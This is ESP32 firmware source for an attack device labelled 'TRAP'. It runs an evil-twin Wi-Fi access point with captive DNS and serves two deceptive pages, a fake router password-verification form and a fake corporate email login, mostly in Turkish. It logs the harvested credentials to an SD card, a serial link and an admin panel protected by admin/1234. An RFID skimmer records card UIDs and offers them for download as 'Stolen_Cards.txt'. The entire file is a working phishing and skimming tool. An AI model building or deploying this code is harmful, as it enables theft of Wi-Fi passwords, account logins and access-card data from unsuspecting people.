/* PROJECT: TRAP - ESP32-WROOM-32S
  MISSION: Evil Twin + Web Downloadable RFID Skimmer
*/

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <SPI.h>
#include <MFRC522.h>
#include "soc/soc.h"
#include "soc/rtc_cntl_reg.h"

// --- PIN DEFINITIONS ---
#define RX_PIN 33 
#define TX_PIN 32
#define SD_CS_PIN 5
#define RFID_CS_PIN 21  
#define RFID_RST_PIN 22 
#define SCK_PIN 18
#define MISO_PIN 19
#define MOSI_PIN 23

MFRC522 mfrc522(RFID_CS_PIN, RFID_RST_PIN); 

WebServer server(80);
DNSServer dnsServer;

bool isRunning = false;
bool skipWiFiPass = false;
bool isRfidScanning = false; 

// --- MEMORY (RAM) VARIABLES ---
String webLogs = "--- HUNT STARTED ---\n";
String rfidLogs = "--- LEAKED CARD NUMBERS ---\n"; 

// HELPER FUNCTION: SAVE TO SD CARD (Does not lock the system even if it fails)
void LogToSD(String logData) {
    Serial.println("YAKALANDI: " + logData);
    File file = SD.open("/captured.txt", FILE_APPEND);
    if (file) {
        file.println(logData);
        file.close();
    } 
}

// ==========================================
// 1. HTML: WIFI PASS 
// ==========================================
const char WIFI_PHISH_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ağ Yönetim Paneli</title>
<style>
    body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; }
    .header { background-color: #005bb5; color: white; padding: 20px; text-align: center; font-size: 22px; font-weight: bold; letter-spacing: 1px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    .container { max-width: 400px; margin: 40px auto; background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
    .warning-icon { font-size: 48px; color: #e67e22; margin-bottom: 10px; }
    h2 { font-size: 20px; margin-bottom: 15px; color: #2c3e50; }
    p { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.6; }
    .input-group { text-align: left; margin-bottom: 25px; }
    .input-group label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: bold; }
    .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 15px; transition: border-color 0.3s; }
    .input-group input:focus { border-color: #005bb5; outline: none; box-shadow: 0 0 5px rgba(0,91,181,0.2); }
    .btn { background-color: #005bb5; color: white; border: none; padding: 14px; width: 100%; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
    .btn:hover { background-color: #004494; }
    .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #aaa; }
</style>
</head>
<body>
    <div class="header">Advanced Network Configuration</div>
    <div class="container">
        <div class="warning-icon">⚠</div>
        <h2>Security Verification Required</h2>
        <p>our router firmware has been updated or an unusual device has been detected on your network. To continue internet access, you must verify your current wireless network password.</p>
        <form action="/validate" method="POST">
            <div class="input-group">
                <label for=Wireless Network (Wi-Fi) Password</label>
                <input type="password" id="wifi_pass" name="wifi_pass" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">Verify and Connect to Network</button>
        </form>
    </div>
    <div class="footer">© 2026 Router Management System. All Rights Reserved.</div>
</body>
</html>
)=====";

// ==========================================
// 2. HTML: EMAIL LOGIN
// ==========================================
const char EMAIL_PHISH_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hesabınızda Oturum Açın</title>
<style>
    body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f6fa; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .login-box { background: white; width: 100%; max-width: 380px; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
    .logo { font-size: 22px; font-weight: 600; color: #5e5e5e; margin-bottom: 25px; display: flex; align-items: center; }
    .logo span { color: #0067b8; font-weight: bold; margin-right: 8px; font-size: 26px; }
    h2 { margin: 0 0 15px 0; font-size: 24px; color: #1b1b1b; font-weight: 600; }
    p { font-size: 14px; color: #1b1b1b; margin-bottom: 30px; line-height: 1.4; }
    input { width: 100%; padding: 10px 0; margin-bottom: 25px; border: none; border-bottom: 1px solid #757575; font-size: 15px; outline: none; transition: border-color 0.2s; background: transparent; }
    input:focus { border-bottom: 2px solid #0067b8; margin-bottom: 24px; }
    input::placeholder { color: #666; font-size: 15px; }
    .btn-container { display: flex; justify-content: flex-end; }
    button { background-color: #0067b8; color: white; border: none; padding: 10px 35px; font-size: 15px; cursor: pointer; transition: background 0.2s; font-weight: 600; }
    button:hover { background-color: #005da6; }
    .footer-links { font-size: 13px; color: #0067b8; text-align: left; margin-top: 20px; cursor: pointer; }
    .footer-links:hover { text-decoration: underline; }
</style>
</head>
<body>
    <div class="login-box">
        <div class="logo"><span>❖</span> Corporate Portal</div>
        <h2>Oturum Açın</h2>
        <p>Please log in with your registered email address to complete network access.</p>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder=""Email, phone, or Zoom" required>
            <input type="password" name="pass" placeholder="Parola" required>
            <div class="btn-container">
                <button type="submit">Next</button>
            </div>
        </form>
        <div class="footer-links">Can't access your account?</div>
    </div>
</body>
</html>
)=====";

// ==========================================
// ROUTE AND LOGGING SETTINGS
// ==========================================
void SetupRoutes() {
  server.onNotFound([]() { 
      if(skipWiFiPass) server.send(200, "text/html", EMAIL_PHISH_HTML);
      else server.send(200, "text/html", WIFI_PHISH_HTML);
  });
  
  server.on("/validate", HTTP_POST, []() {
    String pass = server.arg("wifi_pass");
    Serial2.println("LOG:WIFI_PASS:" + pass); 
    LogToSD("WIFI PASS: " + pass);            
    webLogs += "[WIFI] PASS: " + pass + "\n"; 
    server.send(200, "text/html", EMAIL_PHISH_HTML);
  });
  
  server.on("/login", HTTP_POST, []() {
    String mail = server.arg("email"); String pass = server.arg("pass");
    Serial2.println("LOG:LOGIN:" + mail + "|" + pass);
    LogToSD("EMAIL: " + mail + " | PASS: " + pass);
    webLogs += "[EMAIL] " + mail + " | " + pass + "\n";
    server.send(200, "text/html", "<h1>Connection Successful</h1><script>setTimeout(function(){window.location.href='http://google.com';},1000);</script>");
  });

  server.on("/admin", []() {
      if (!server.authenticate("admin", "1234")) return server.requestAuthentication();
      String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
      html += "<style>body{background:#111;color:#0f0;font-family:monospace;padding:20px}textarea{width:100%;height:400px;background:#222;color:#fff;border:1px solid #444;padding:10px}button{padding:10px 20px;background:#c00;color:white;border:none;cursor:pointer;margin-top:10px}</style>";
      html += "<meta http-equiv='refresh' content='5'>"; 
      html += "</head><body>";
      html += "<h1>[ HACKER ADMIN PANEL ]</h1>";
      html += "<textarea readonly>" + webLogs + "</textarea>";
      html += "<br><br><a href='/clear'><button>Connection Successful</button></a>";
      html += "</body></html>";
      server.send(200, "text/html", html);
  });

  server.on("/clear", []() {
      if (!server.authenticate("admin", "1234")) return server.requestAuthentication();
      webLogs = "--- LOGS CLEARED ---\n";
      server.sendHeader("Location", "/admin");
      server.send(302, "text/plain", "");
  });
   
  //  wifi download 
  server.on("/rfid", HTTP_GET, []() {
      server.sendHeader("Content-Disposition", "attachment; filename=\"Stolen_Cards.txt\"");
      server.send(200, "text/plain", rfidLogs);
  });

  server.begin();
}

// ==========================================
// SETUP 
// ==========================================
void setup() {
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); 
  Serial.begin(115200);
  Serial2.begin(9600, SERIAL_8N1, RX_PIN, TX_PIN); 
  
  pinMode(RFID_CS_PIN, OUTPUT); digitalWrite(RFID_CS_PIN, HIGH); 
  pinMode(SD_CS_PIN, OUTPUT); digitalWrite(SD_CS_PIN, HIGH);
  
  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN);
  
  Serial.println("Testing SD Card...");
  SD.begin(SD_CS_PIN); 
  
  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_OFF);
  
  Serial.println("SYSTEM READY, AWAITING COMMAND");
}

// ==========================================
// LOOP
// ==========================================
void loop() {
  if(Serial2.available()) {
    String cmd = Serial2.readStringUntil('\n');
    cmd.trim();
    
    Serial.println("INCOMING COMMAND: " + cmd);
    
    if(cmd.startsWith("CMD:EVIL:")) {
      String ssidName = cmd.substring(9); 
      skipWiFiPass = false; 
      WiFi.mode(WIFI_AP);
      if(WiFi.softAP(ssidName.c_str())) {
          dnsServer.start(53, "*", WiFi.softAPIP());
          SetupRoutes();
          isRunning = true;
      }
    }
    else if(cmd.startsWith("CMD:EVIL_EMAIL:")) {
      String ssidName = cmd.substring(15); 
      skipWiFiPass = true; 
      WiFi.mode(WIFI_AP);
      if(WiFi.softAP(ssidName.c_str())) {
          dnsServer.start(53, "*", WiFi.softAPIP());
          SetupRoutes(); 
          isRunning = true;
      }
    }
    // --- RFID COMMAND ---
    else if(cmd == "CMD:RFID") {
      Serial.println("STARTING RFID SKIMMER");
      
      WiFi.mode(WIFI_AP);
      WiFi.softAP("RFID_VAULT"); 
      SetupRoutes();             
      isRunning = true;          
      
      rfidLogs = "--- LEAKED CARD NUMBERS ---\n";
      
      mfrc522.PCD_Init(); 
      isRfidScanning = true;
    }
    else if(cmd == "STOP") {
      Serial.println("ATTACK STOPPED");
      isRunning = false;
      isRfidScanning = false;
      server.stop();
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_OFF);
    }
  }
  
  // Keep the web server constantly active (Required for connection and download)
  if(isRunning) {
    dnsServer.processNextRequest();
    server.handleClient();
  }
  
  // RFID Reading Task
  if(isRfidScanning) {
    if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial()) {
        
        String uidString = "";
        for (byte i = 0; i < mfrc522.uid.size; i++) {
            if (mfrc522.uid.uidByte[i] < 0x10) uidString += "0";
            uidString += String(mfrc522.uid.uidByte[i], HEX);
        }
        uidString.toUpperCase();
        
        Serial.println("CARD FOUND: " + uidString);
        
        Serial2.println("LOG:RFID:" + uidString); 
        
        LogToSD("RFID_UID: " + uidString);
        
        rfidLogs += "KART ID: " + uidString + "\n";
        
        webLogs += "[RFID] CARD: " + uidString + "\n";
        
        mfrc522.PICC_HaltA(); 
        delay(1000); 
    }
  }
}